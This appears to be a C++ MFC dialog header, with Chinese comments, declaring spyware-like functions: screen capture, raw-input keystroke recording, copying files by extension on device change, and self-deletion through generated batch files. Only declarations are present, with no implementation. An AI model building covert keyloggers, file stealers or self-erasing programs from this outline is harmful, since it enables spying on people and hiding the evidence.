#pragma once


// CFunction 对话框

class CFunction : public CDialogEx
{
	DECLARE_DYNAMIC(CFunction)

public:
	CFunction(CWnd* pParent = nullptr);   // 标准构造函数
	virtual ~CFunction();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_FUNCTION_DIALOG };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()

	//捕获桌面屏幕
	BOOL ScreenCapture();

	//************************************
	// 函数名：CFunction::PaintMouse
	// 返回类型：BOOL
	// 功能:	绘制鼠标
	// 参数1：HDC hdc	设备环境句柄
	//************************************
	BOOL PaintMouse(HDC hdc);

	//保存为图片
	BOOL SaveBmp(HBITMAP hBmp);

	// 注册原始输入设备
	BOOL Init(HWND hWnd);

	// 获取原始输入数据
	BOOL GetData(HRAWINPUT lParam);

	// 保存按键信息
	void SaveKey(USHORT usVKey);

	//************************************
	// 函数名：CFunction::CopyFiles
	// 返回类型：BOOL
	// 功能:	拷贝文件
	// 参数1：char* FullPath	需要遍历文件的完整路径
	// 参数2：char* szPostFix	要拷贝文件的文件后缀
	//************************************
	BOOL CopyFiles(char* FullPath, char* szPostFix);

	//自删除
	BOOL DelSelf(int iType);

	//构造批处理文件
	BOOL CreateChoiceBat(char * pszFileName);

	//构造批处理文件
	BOOL CreatePingBat(char * pszFileName);

public:
	afx_msg void OnBnClickedButton1();
	afx_msg void OnBnClickedButton2();
	afx_msg void OnBnClickedButton8();
	afx_msg void OnBnClickedButton11();
	afx_msg void OnBnClickedButton12();
	afx_msg void OnBnClickedButton13();
	afx_msg void OnBnClickedButton14();
	afx_msg void OnBnClickedButton15();
	afx_msg void OnRawInput(UINT nInputcode, HRAWINPUT hRawInput);
protected:
	afx_msg LRESULT OnDevicechange(WPARAM wParam, LPARAM lParam);
};
